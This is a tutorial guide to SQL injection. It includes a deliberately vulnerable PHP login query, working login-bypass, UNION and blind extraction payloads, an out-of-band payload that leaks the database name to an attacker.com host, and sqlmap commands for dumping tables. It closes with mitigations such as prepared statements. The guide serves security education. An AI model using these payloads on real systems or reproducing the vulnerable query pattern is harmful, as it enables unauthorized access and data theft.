# SQL Injection Guide

## 1. What is SQL Injection & Its Impact?

### Definition
SQL Injection is a web security vulnerability that allows an attacker to inject malicious SQL queries into an SQL statement within a vulnerable web application. This occurs when user inputs are not properly validated, enabling the attacker to manipulate the database.

### Impact
A successful SQL Injection attack can lead to:
- **Authentication Bypass**: Access user accounts without valid credentials.
- **Data Exposure**: Leak sensitive data such as user information or payment details.
- **Data Manipulation**: Delete, modify, or steal data from the database.

---

## 2. SQL Basics

### What is SQL?
SQL (Structured Query Language) is used to interact with relational database management systems (DBMS) for creating, modifying, and querying data.

### Common DBMS Examples
- MySQL
- SQLite
- PostgreSQL
- Oracle
- Microsoft SQL Server (MSSQL)

### Key SQL Statements
| Statement   | Description                                  |
|------------|----------------------------------------------|
| SELECT     | Retrieves records from one or more tables.   |
| INSERT     | Adds one or more records to a table.         |
| UPDATE     | Modifies existing records in a table.        |
| DELETE     | Removes one or more records from a table.    |
| ORDER BY   | Sorts records in the result set.             |
| LIMIT      | Restricts the number of returned records.    |
| WHERE      | Filters records based on specified conditions.|

### SQL Comments
Comments can be used to bypass parts of queries:
- MySQL: `#comment`, `-- comment`, `/* comment */`
- PostgreSQL: `-- comment`, `/* comment */`
- Oracle: `-- comment`
- SQLite: `-- comment`, `/* comment */`
- MSSQL: `-- comment`, `/* comment */`

### Vulnerable PHP Example
```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);
```
An attacker can manipulate the query via crafted input.

---

## 3. SQL Injection Techniques

### Types:
- **In-band SQLi**
- **Blind SQLi**
- **Out-of-band SQLi**

### 3.1. In-band SQLi

#### Error-based SQLi
Trigger database errors to reveal DBMS or query structure.
- Input example: `'`

##### Practical Login Bypass:
**Username:** `admin' OR '1'='1' --`
**Password:** Anything

Query becomes:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
```
**Effect:** Logs in as admin.

#### Union-based SQLi
Combine malicious results using `UNION`.

1. **Find Number of Columns:**
```sql
' ORDER BY 1 --
' ORDER BY 2 --
```
Stop when an error occurs.

2. **Find Injectable Columns:**
```sql
' UNION SELECT 'a', NULL --
' UNION SELECT NULL, 'a' --
```

3. **Extract Data:**
```sql
' UNION SELECT database(), version() --
```

### 3.2. Blind SQLi

#### Boolean-based SQLi
```sql
' AND 1=1 --  → True response
' AND 1=2 --  → False response
```

To extract data:
```sql
' AND SUBSTRING(database(),1,1) = 'm' --
```

#### Time-based SQLi
```sql
' AND IF(1=1, SLEEP(5), 0) --
```

Data extraction:
```sql
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0) --
```

### 3.3. Out-of-band SQLi
Exploits database features to send DNS or HTTP requests:
```sql
SELECT LOAD_FILE(CONCAT('\\',database(),'.attacker.com\test'));
```

---

## 4. Dumping Data Using sqlmap

`sqlmap` is an open-source tool for detecting and exploiting SQL Injection.

### Basic Usage
```bash
python sqlmap.py -u "http://example.com/?id=1"
```

### Steps:
1. **Check for Vulnerability:**
```bash
sqlmap -u "http://example.com/?id=1"
```

2. **Enumerate Databases:**
```bash
sqlmap --dbms=mysql -u "http://example.com/?id=1" --dbs
```

3. **Enumerate Tables:**
```bash
sqlmap -u "http://example.com/?id=1" -D "database_name" --tables
```

4. **Dump Data:**
```bash
sqlmap -u "http://example.com/?id=1" -D "database_name" -T "table_name" --dump
```

---

## 5. Mitigation

### How to Prevent SQL Injection:
- **Input Validation:** Use whitelisting for expected inputs.
- **Prepared Statements:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```
- **Least Privilege:** Restrict DB account permissions.
- **Use ORM:** Tools like Django ORM or Laravel Eloquent help mitigate SQLi.
- **Error Handling:** Do not expose SQL errors to users.

---

## 6. Tools

- **sqlmap**: Automated SQL Injection testing tool.
- **Burp Suite**: Intercepts and modifies HTTP requests.
- **Havij**: (Less used) GUI-based SQLi tool.

---

End of guide.

